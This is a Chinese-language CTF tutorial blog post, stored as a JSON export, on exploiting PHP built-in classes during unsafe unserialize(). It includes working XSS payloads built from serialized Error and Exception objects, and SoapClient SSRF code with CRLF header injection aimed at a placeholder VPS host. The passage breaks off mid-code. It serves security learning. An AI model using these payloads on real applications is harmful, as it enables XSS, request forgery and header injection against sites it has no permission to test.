{"title":"PHP 常见内置类浅析","uid":"66ce77a9cc55d19533b30410eadbc5d9","slug":"PHP常见内置类浅析","date":"2023-04-07T18:36:20.000Z","updated":"2023-04-23T01:50:38.000Z","comments":true,"path":"api/articles/PHP常见内置类浅析.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141530896.png","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>周末看题，遇PHP原生类，坐牢，此前未学，故学，浅结，如下。</p>\n<h1 id=\"PHP原生类\"><a href=\"#PHP原生类\" class=\"headerlink\" title=\"PHP原生类\"></a>PHP原生类</h1><h2 id=\"基础概念\"><a href=\"#基础概念\" class=\"headerlink\" title=\"基础概念\"></a>基础概念</h2><p>什么是原生类呢，接下来来简单介绍一下它。</p>\n<p><strong>PHP原生类就是在标准PHP库中已经封装好的类</strong>，而在其中，有些类具有一些功能，例如文件读取、目录遍历等，这就给了我们可乘之机，我们只需要实例化这些类，就可以实现文件读取这种敏感操作。</p>\n<p>在CTF中，有时会遇到一些奇怪的题，比如没有给出反序列化的类，这个时候可能就需要用到PHP原生类了</p>\n<p>我们可以通过如下脚本来获取调用了常见魔术方法的原生类</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$classes</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_declared_classes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$classes</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$class</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$methods</span> <span class=\"token operator\">=</span> <span class=\"token function\">get_class_methods</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$methods</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$method</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$method</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n            <span class=\"token string single-quoted-string\">'__destruct'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'__toString'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'__wakeup'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'__call'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'__callStatic'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'__get'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'__set'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'__isset'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'__unset'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'__invoke'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string single-quoted-string\">'__set_state'</span>    <span class=\"token comment\">// 如果题目中有其他的魔术方法，可自行添加进来, 来遍历存在指定方法的原生类</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">print</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'::'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$method</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span> </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>其输出结果如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token class-name static-context\">Exception</span><span class=\"token operator\">::</span><span class=\"token constant\">__wakeup</span>\n<span class=\"token class-name static-context\">Exception</span><span class=\"token operator\">::</span><span class=\"token constant\">__toString</span>\n<span class=\"token class-name static-context\">ErrorException</span><span class=\"token operator\">::</span><span class=\"token constant\">__wakeup</span>\n<span class=\"token class-name static-context\">ErrorException</span><span class=\"token operator\">::</span><span class=\"token constant\">__toString</span>\n<span class=\"token class-name static-context\">Error</span><span class=\"token operator\">::</span><span class=\"token constant\">__wakeup</span>\n<span class=\"token class-name static-context\">Error</span><span class=\"token operator\">::</span><span class=\"token constant\">__toString</span>\n<span class=\"token class-name static-context\">ParseError</span><span class=\"token operator\">::</span><span class=\"token constant\">__wakeup</span>\n<span class=\"token class-name static-context\">ParseError</span><span class=\"token operator\">::</span><span class=\"token constant\">__toString</span>\n<span class=\"token class-name static-context\">TypeError</span><span class=\"token operator\">::</span><span class=\"token constant\">__wakeup</span>\n<span class=\"token class-name static-context\">TypeError</span><span class=\"token operator\">::</span><span class=\"token constant\">__toString</span>\n<span class=\"token class-name static-context\">ArgumentCountError</span><span class=\"token operator\">::</span><span class=\"token constant\">__wakeup</span>\n<span class=\"token class-name static-context\">ArgumentCountError</span><span class=\"token operator\">::</span><span class=\"token constant\">__toString</span>\n<span class=\"token class-name static-context\">ArithmeticError</span><span class=\"token operator\">::</span><span class=\"token constant\">__wakeup</span>\n<span class=\"token class-name static-context\">ArithmeticError</span><span class=\"token operator\">::</span><span class=\"token constant\">__toString</span>\n<span class=\"token class-name static-context\">DivisionByZeroError</span><span class=\"token operator\">::</span><span class=\"token constant\">__wakeup</span>\n<span class=\"token class-name static-context\">DivisionByZeroError</span><span class=\"token operator\">::</span><span class=\"token constant\">__toString</span>\n<span class=\"token class-name static-context\">Generator</span><span class=\"token operator\">::</span><span class=\"token constant\">__wakeup</span>\n<span class=\"token class-name static-context\">ClosedGeneratorException</span><span class=\"token operator\">::</span><span class=\"token constant\">__wakeup</span>\n<span class=\"token class-name static-context\">ClosedGeneratorException</span><span class=\"token operator\">::</span><span class=\"token constant\">__toString</span>\n<span class=\"token operator\">...</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>常用的有以下几个</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Error\nException\nSoapClient\nDirectoryIterator\nSimpleXMLElement\nSplFileObject<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来对其进行简单讲解</p>\n<h2 id=\"XSS-By-Error-Exception\"><a href=\"#XSS-By-Error-Exception\" class=\"headerlink\" title=\"XSS By Error/Exception\"></a>XSS By Error/Exception</h2><h3 id=\"Error\"><a href=\"#Error\" class=\"headerlink\" title=\"Error\"></a>Error</h3><h4 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" title=\"前提\"></a>前提</h4><p><strong>适用于php7版本</strong></p>\n<p><strong>在开启报错的情况下</strong></p>\n<h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p><strong>Error</strong> 是所有PHP内部错误类的基类，用于自动自定义一个<code>Error</code>，该类是在PHP 7.0.0 中开始引入的（此即前提条件一之原因）。</p>\n<p><code>Error</code>类中含有一个<code>__tostring</code>魔术方法，如果把它当做字符串使用，就会触发该魔术方法。例如我们对其进行输出操作(<code>echo</code>)，此时就会自动调用<code>__tostring</code>魔术方法，如果<code>Error</code>类中内容为<code>XSS</code>恶意语句，此时就会导致XSS</p>\n<h4 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h4><p>现有题目如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>对代码进行简单分析，这里对传入的<code>a</code>参数直接进行反序列化而后进行了输出操作。这明显是一个PHP反序列化的问题，但却没给出反序列化的类，此时就要考虑用PHP原生类了。</p>\n<p>构造<code>Poc</code>如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script>alert('xss')&lt;/script>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n<span class=\"token comment\">#O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A39%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Chtml%5Cqq.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来访问构造好的题目环境，将构造好的<code>Payload</code>赋值给<code>a参数</code>。</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070056255.png\" alt=\"image-20230407005614138\"></p>\n<p>成功触发XSS</p>\n<h3 id=\"Exception\"><a href=\"#Exception\" class=\"headerlink\" title=\"Exception\"></a>Exception</h3><h4 id=\"前提-1\"><a href=\"#前提-1\" class=\"headerlink\" title=\"前提\"></a>前提</h4><p><strong>适用于php5、7版本</strong></p>\n<p><strong>开启报错的情况下</strong></p>\n<h4 id=\"原理-1\"><a href=\"#原理-1\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p><strong>Exception</strong>是所有用户级异常的基类，它触发XSS的原理与<strong>Error</strong>类似，类中也存在一个<code>__tostring</code>魔术方法，当其被触发且类中存在恶意代码时，此时就会出现<code>XSS</code>。</p>\n<h4 id=\"demo-1\"><a href=\"#demo-1\" class=\"headerlink\" title=\"demo\"></a>demo</h4><p>题目同上</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>Poc</code>如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script>alert('xss')&lt;/script>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n<span class=\"token comment\">#O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A40%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Chtml%5C877.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070102665.png\" alt=\"image-20230407010213587\"></p>\n<p>成功触发XSS</p>\n<h2 id=\"SSRF-By-SoapClient\"><a href=\"#SSRF-By-SoapClient\" class=\"headerlink\" title=\"SSRF By SoapClient\"></a>SSRF By SoapClient</h2><p>首先来简单介绍一下<strong>SoapClient 类</strong></p>\n<h3 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h3><p>首先看看SOAP的介绍</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">SOAP，作为webService三要素(SOAP、WSDL、UDDI)之一，用来描述传递信息的格式，SOAP可以和现存的许多因特网协议和格式结合使用，包括超文本传输协议（HTTP），简单邮件传输协议（SMTP），多用途网际邮件扩充协议（MIME）。它还支持从消息系统到远程过程调用（RPC）等大量的应用程序。SOAP使用基于XML的数据结构和超文本传输协议(HTTP)的组合定义了一个标准的方法来使用Internet上各种不同操作环境中的分布式对象。(以上来自百度百科)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>简单的说，就是这个SOAP可以发送请求，当我们能够控制数据包中的内容时，就可以通过<strong>GET/POST</strong>方法进行传参，进而发起SSRF。</p>\n<p><strong>注：如果想要使用SoapClient类需要在php.ini配置文件里面开启extension=php_soap.dll选项</strong></p>\n<p>接下来来看一下PHP SoapClient类的部分内容</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">SoapClient <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">/* 方法 */</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__construct</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span> <span class=\"token variable\">$wsdl</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__call</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$name</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$args</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">mixed</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__doRequest</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$request</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$location</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$action</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">int</span> <span class=\"token variable\">$version</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">bool</span> <span class=\"token variable\">$oneWay</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__getCookies</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">array</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__getFunctions</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">array</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__getLastRequest</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__getLastRequestHeaders</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__getLastResponse</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__getLastResponseHeaders</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__getTypes</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">array</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__setCookie</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$name</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span> <span class=\"token variable\">$value</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">void</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__setLocation</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$location</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__setSoapHeaders</span> <span class=\"token punctuation\">(</span> <span class=\"token class-name\">SoapHeader</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">array</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span> <span class=\"token variable\">$headers</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">bool</span>\n    <span class=\"token keyword\">public</span> <span class=\"token function\">__soapCall</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$name</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$args</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">array</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span> <span class=\"token variable\">$options</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span> <span class=\"token punctuation\">,</span> <span class=\"token class-name\">SoapHeader</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">array</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span> <span class=\"token variable\">$inputHeaders</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">array</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$outputHeaders</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token keyword return-type\">mixed</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看出这里存在一个<code>__call</code>方法，而正是由于这个魔术方法，导致了SSRF的出现。当<code>__call</code>魔术方法被调用时，它就会向目标URL发送一个<code>soap</code>请求，也可以理解为<code>HTTP/HTTPS</code>请求。</p>\n<p>接下来看一下该函数的参数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">public</span> <span class=\"token function\">__construct</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-declaration\">string</span><span class=\"token operator\">|</span><span class=\"token keyword type-declaration\">null</span> <span class=\"token variable\">$wsdl</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">array</span> <span class=\"token variable\">$options</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>从这里可以看出需要两个参数，第一个参数<code>$wsdl</code>用来指明是否为<code>wsdl</code>模式，这个一般不开，也用不到，所以不进行讲解，有兴趣的师傅可自行参考<a href=\"https://www.cnblogs.com/hujun1992/p/wsdl.html%E3%80%82%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%9C%8B%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%98%AF%60wsdl%60%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%88%99%E5%AE%83%E6%98%AF%E5%8F%AF%E9%80%89%E9%A1%B9(%E5%8F%AF%E5%86%99%E5%8F%AF%E4%B8%8D%E5%86%99)%EF%BC%8C%E8%8B%A5%E4%B8%8D%E6%98%AF%60wsdl%60%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%88%99%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%E5%BF%85%E9%A1%BB%E5%86%99%EF%BC%8C%E4%B8%94%E6%95%B0%E7%BB%84%E4%B8%AD%E5%BF%85%E9%A1%BB%E8%A6%81%E8%AE%BE%E7%BD%AE%60location%60%E5%92%8C%60uri%60%E9%80%89%E9%A1%B9%EF%BC%8C%E5%85%B6%E4%B8%AD%60location%60%E6%98%AF%E7%9B%AE%E6%A0%87URL%EF%BC%8C%E8%80%8C%60uri%60%E6%98%AF%60SOAP%60%E6%9C%8D%E5%8A%A1%E7%9A%84%E7%9B%AE%E6%A0%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4\">https://www.cnblogs.com/hujun1992/p/wsdl.html。接下来看第二个参数，如果是`wsdl`模式，则它是可选项(可写可不写)，若不是`wsdl`模式，则第二个参数必须写，且数组中必须要设置`location`和`uri`选项，其中`location`是目标URL，而`uri`是`SOAP`服务的目标命名空间</a></p>\n<h3 id=\"demo-2\"><a href=\"#demo-2\" class=\"headerlink\" title=\"demo\"></a>demo</h3><p>既然此类可发送请求，且URL可控，那我们监听本机一个端口，同时发起一个请求，看看会有什么反应。</p>\n<p>首先在VPS开启监听</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070303309.png\" alt=\"image-20230407030329272\"></p>\n<p>接下来我们去请求这个端口，看看有何响应</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'quan9i'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'location'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://ip:7777'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$c</span> <span class=\"token operator\">-></span> <span class=\"token function\">abc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来运行php文件，在VPS上收到响应</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304070304667.png\" alt=\"image-20230407030432490\"></p>\n<p>从这里可以看到**SOAPAction: “quan9i#abc”**，<code>quan9i</code>是我们写入的<code>uri</code>，<code>abc</code>则是我们调用的<code>方法名</code>，因此如果<code>HTTP头部</code>还存在<code>CRLF</code>漏洞(即插入<code>\\r\\n</code>)的话，但我们则可以通过<code>SSRF+CRLF</code>，插入任意的HTTP头或是POST报文。接下来实验一下</p>\n<p>插入Cookie</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'http://VPS:7777'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'user_agent'</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"quan9i\\r\\nCookie: PHPSESSID=abcdefghijklmn\"</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'uri'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'qwq'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$c</span> <span class=\"token operator\">-></span> <span class=\"token function\">abc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" 